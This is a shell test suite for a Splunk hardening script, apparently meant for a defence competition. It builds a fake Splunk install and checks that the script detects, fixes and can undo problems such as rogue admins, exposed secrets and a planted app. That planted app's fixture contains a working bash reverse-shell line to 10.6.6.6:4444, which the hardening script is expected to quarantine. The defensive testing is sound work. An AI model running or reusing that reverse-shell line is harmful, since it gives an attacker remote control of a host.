#!/bin/sh
# Tests for roles/applications/SV-44-splunk-hardening.sh.
# A stand-in Splunk: the real file layout (etc/passwd, etc/apps, inputs.conf,
# deploymentclient.conf, authorize.conf, splunk.secret, user-seed.conf), a
# process called splunkd, a bin/splunk that only logs restarts, and a
# stand-in for the REST API on 8089 (BT_SPLUNK_CURL) that keeps each
# user's password in etc/passwd so a file restore is a password restore.
# Checks: everything is found; a dry run changes nothing; --apply changes
# the passwords (tested by logging in), disables the planted scripted input,
# quarantines the planted app, removes the deployment client, fixes the
# secrets, restarts once; no password reaches the output; the undo puts it
# all back; a test search that fails after the restart puts it back on its
# own.  Nothing outside the test folder is touched.
. "$(dirname "$0")/helper.sh"
SH=${TEST_SHELL:-sh}
C="$T_ROOT/roles/applications/SV-44-splunk-hardening.sh"
export BT_SKIP_VERIFY=1
O="$T_TMP/out"; S="$T_TMP/splunk"; B="$T_TMP/bin"
mkdir -p "$B"
cat >"$B/curl" <<'STUB'
#!/bin/sh
# Stand-in for curl talking to Splunk's REST API.  Passwords live in
# $SV44_HOME/etc/passwd as "plain:PASSWORD" in the hash field.
out=/dev/null; m=GET; cfg=""; data=""; url=""
while [ $# -gt 0 ]; do
    case "$1" in
        -K) cfg=$2; shift 2 ;; -X) m=$2; shift 2 ;; -o) out=$2; shift 2 ;; -w|-m) shift 2 ;;
        --data-urlencode) data="$data $2"; shift 2 ;; -*) shift ;; *) url=$1; shift ;;
    esac
done
P="$SV44_HOME/etc/passwd"
cred=$(sed -n 's/^user = "\(.*\)"$/\1/p' "$cfg"); u=${cred%%:*}; p=${cred#*:}
val() { for d in $data; do case "$d" in "$1@"*) cat "${d#*@}" ;; esac; done; }
path=$(printf '%s' "$url" | sed 's|^https://[^/]*/||')
code=401
if awk -F: -v u="$u" -v p="plain$p" '$2 == u && $3 == p { f = 1 } END { exit !f }' "$P"; then
    code=200
    case "$path" in
        services/authentication/users/*)
            t=${path##*/}; np=$(val password)
            if [ "$t" = "$u" ] && [ "$(val oldpassword)" != "$p" ]; then code=400
            else awk -F: -v OFS=: -v t="$t" -v h="plain$np" '$2 == t { $3 = h } { print }' "$P" >"$P.n" && cat "$P.n" >"$P" && rm -f "$P.n"; fi ;;
        services/search/jobs/export) [ -f "$SV44_HOME/searchbroken" ] && code=500 ;;
    esac
fi
echo '{}' >"$out"; printf '%s' "$code"
STUB
chmod +x "$B/curl"
BT_SPLUNK_CURL="$B/curl"; SV44_HOME=$S; export BT_SPLUNK_CURL SV44_HOME

mksplunk() {
    rm -rf "$S"; mkdir -p "$S/bin" "$S/etc/system/local" "$S/etc/auth" "$S/etc/apps/search/default" "$S/etc/apps/evilapp/bin" "$S/etc/apps/evilapp/local"
    printf 'VERSION=9.2.1\n' >"$S/etc/splunk.version"; touch -d '2020-01-01' "$S/etc/splunk.version"
    printf ':admin:plainOldAdmin44x::Administrator:admin:a@x::1\n:scorer:plainScore44x::Scorer:user:s@x::2\n:evil:plainEvil44x::Evil:admin:e@x::3\n' >"$S/etc/passwd"
    chmod 600 "$S/etc/passwd"
    printf 'secretkey\n' >"$S/etc/auth/splunk.secret"; chmod 644 "$S/etc/auth/splunk.secret"
    printf '[user_info]\nUSERNAME = admin\nHASHED_PASSWORD = x\n' >"$S/etc/system/local/user-seed.conf"
    printf '[target-broker:deploymentServer]\ntargetUri = 10.6.6.6:8089\n' >"$S/etc/system/local/deploymentclient.conf"
    printf '[role_power2]\nedit_user = enabled\n' >"$S/etc/system/local/authorize.conf"
    printf '[script://./bin/stats.sh]\ndisabled = 0\ninterval = 300\n' >"$S/etc/apps/search/default/inputs.conf"
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.6.6.6/4444 0>&1\n' >"$S/etc/apps/evilapp/bin/rev.sh"
    printf '[script://./bin/rev.sh]\ninterval = 60\n' >"$S/etc/apps/evilapp/local/inputs.conf"
    printf '#!/bin/sh\necho "$*" >>"%s/restarts"\n' "$S" >"$S/bin/splunk"; chmod +x "$S/bin/splunk"
}
snap() { (cd "$S" && find etc -exec ls -lnd {} + | awk '{ print $1, $NF }' | sort; find etc -type f -exec cat {} +) | cksum; }
printf 'admin OldAdmin44x\n' >"$T_TMP/auth"; chmod 600 "$T_TMP/auth"
run() { $SH "$C" --splunk-home "$S" --out "$O" --no-color --auth-file "$T_TMP/auth" "$@"; }
# A process called splunkd, so the script sees Splunk running.
# A real file: under ksh93 and busybox, 'command -v sleep' prints just "sleep".
SLEEP=""; for _d in /usr/bin /bin; do [ -x "$_d/sleep" ] && { SLEEP=$_d/sleep; break; }; done
cp "$SLEEP" "$T_TMP/splunkd"; "$T_TMP/splunkd" 600 & SPID=$!
# Wait until it shows up as splunkd (right after the fork it is still the shell).
_i=0; while ! ps -eo comm= | grep -qx splunkd && [ "$_i" -lt 50 ]; do sleep 1; _i=$((_i + 1)); done

t_start "options"
$SH "$C" --only everything >/dev/null 2>&1; t_eq "$?" 2 "an unknown fix exits 2"
$SH "$C" --length 6 >/dev/null 2>&1; t_eq "$?" 2 "a short --length exits 2"
out=$($SH "$C" --out "$O" --batch --splunk-home "$T_TMP" 2>&1); t_has "$out" "SV-44" "runs with a folder that is not Splunk"
out=$($SH "$C" --help 2>&1); t_has "$out" "--auth-file FILE" "--help"

t_start "find"
mksplunk; before=$(snap)
out=$(run --batch 2>&1)
t_has "$out" "logged in to 8089 as admin" "logs in with --auth-file"
t_has "$out" "user evil: roles: admin" "an extra admin is listed"
t_has "$out" "power2 has edit_user" "a role that can make admins is flagged"
t_has "$out" "takes apps from 10.6.6.6:8089" "a deployment server is flagged"
t_has "$out" "app evilapp: did not come with Splunk" "the planted app is flagged"
t_has "$out" "[!] scripted input: script://./bin/rev.sh in app evilapp" "its scripted input is HIGH"
t_has "$out" "[*] scripted input: script://./bin/stats.sh in app search" "a built-in app's input is only looked at"
t_has "$out" "splunk.secret is -rw-r--r--" "a readable secret is flagged"
t_has "$out" "user-seed.conf is still there" "user-seed.conf is flagged"
t_hasnt "$out" "changeme' WORKS" "the default password is not reported when it does not work"
t_has "$out" "Dry run: nothing was changed" "dry run without --apply"
t_eq "$(snap)" "$before" "a dry run changes nothing"
t_fail "no CSV files are left" sh -c "find '$O' -name '*.csv' | grep -q ."

t_start "apply"
_u0=$(cat "$O"/undo-*.log 2>/dev/null | grep -c .)
out=$(run --batch --no-protected --no-timer --apply --only passwords,scripts-off,app-quarantine,deploy-off,secrets-perms --quarantine evilapp --exclude scorer 2>&1)
d=$(ls -d "$O"/splunk-* | sort -t- -k3 -n | tail -n 1)
t_has "$out" "[+] evil: new password, login tested" "a user gets a new password"
t_has "$out" "[+] admin: new password, login tested" "the admin too (with its old password)"
t_hasnt "$(cat "$S/etc/passwd")" "plainOldAdmin44x" "the admin's old password is gone"
t_has "$(cat "$S/etc/passwd")" "plainScore44x" "--exclude keeps the scoring user"
_np=$(awk '$1 == "admin" { print $2 }' "$d/passwords.txt")
t_has "$(cat "$d/summary.txt")" "[!] SCORED ACCOUNTS: submit each new password in the scoring engine" "the summary says to submit scored passwords to the scoring engine"
t_has "$(cat "$S/etc/passwd")" "plain$_np" "the new admin password is the one in passwords.txt"
t_eq "$(ls -l "$d/passwords.txt" | cut -c1-10)" "-rw-------" "passwords.txt is root only"
t_fail "the planted app is out of etc/apps" test -d "$S/etc/apps/evilapp"
t_fail "the deployment client is removed" test -f "$S/etc/system/local/deploymentclient.conf"
t_eq "$(ls -l "$S/etc/auth/splunk.secret" | cut -c1-10)" "-rw-------" "splunk.secret is 600"
t_fail "user-seed.conf is removed" test -f "$S/etc/system/local/user-seed.conf"
t_eq "$(grep -c restart "$S/restarts" 2>/dev/null)" 1 "Splunk is restarted once"
t_has "$out" "8089 answers and a test search runs" "and tested after the restart"
t_fail "no new password in output.txt" grep -q "$_np" "$d/output.txt"
t_fail "nor in the log" sh -c "grep -q '$_np' '$O'/*.log"
t_fail "nor the old admin password in the run folder or the logs" sh -c "grep -rq OldAdmin44x '$d' '$O'/*.log"

t_start "undo"
cat "$O"/undo-*.log | awk -F'\t' -v n="$_u0" 'NR > n { l[NR] = $4 } END { for (i = NR; i > n; i--) print l[i] }' >"$T_TMP/undo.sh"
sh "$T_TMP/undo.sh" >/dev/null 2>&1
t_eq "$(snap)" "$before" "undo puts every file, password and mode back"

t_start "a broken search after the restart puts it back"
mksplunk; before=$(snap); : >"$S/searchbroken"
out=$(run --batch --no-protected --no-timer --apply --only scripts-off 2>&1)
t_has "$out" "the test search FAILS" "the failed search is caught"
t_has "$out" "APPLIED, then PUT BACK" "and everything is put back"
rm -f "$S/searchbroken" "$S/restarts"
t_eq "$(snap)" "$before" "the files are as before"

t_start "questions on a terminal"
if command -v script >/dev/null 2>&1; then
    mksplunk
    # passwords y, scripts-off y, app-quarantine y, deploy-off n, secrets-perms n;
    # one by one y; admin k, scorer k, evil s + typed twice; app evilapp q;
    # apply Enter; restart Enter; keep at the end: no timer
    printf 'y\ny\ny\nn\nn\ny\nk\nk\ns\nTyped44Pass!\nTyped44Pass!\nq\n\n\n' >"$T_TMP/ans"
    tt=$(BT_NO_TTY=0 script -qc "$SH '$C' --splunk-home '$S' --out '$O' --no-color --auth-file '$T_TMP/auth' --no-protected --no-timer --apply" /dev/null <"$T_TMP/ans" 2>&1)
    t_has "$tt" "[s] set one: you type it twice" "each user lists its answers"
    t_has "$tt" "[q] quarantine it" "each app lists its answers"
    t_has "$(cat "$S/etc/passwd")" "plainTyped44Pass!" "the typed password is set"
    t_has "$(cat "$S/etc/passwd")" "plainOldAdmin44x" "a kept user keeps its password"
    t_fail "the typed password is not in the output" sh -c "grep -rq 'Typed44Pass' '$O'/*.log \"\$(ls -d '$O'/splunk-* | sort -t- -k3 -n | tail -n 1)/output.txt\""
    t_fail "the app is quarantined" test -d "$S/etc/apps/evilapp"
    t_ok "the deployment client stays (answered n)" test -f "$S/etc/system/local/deploymentclient.conf"
fi

t_start "the old default password"
mksplunk; awk -F: -v OFS=: '$2 == "admin" { $3 = "plainchangeme" } { print }' "$S/etc/passwd" >"$S/p" && cat "$S/p" >"$S/etc/passwd" && rm "$S/p"
out=$(run --batch 2>&1)
t_has "$out" "the old default password 'changeme' WORKS" "admin/changeme is HIGH"

kill "$SPID" 2>/dev/null
t_done
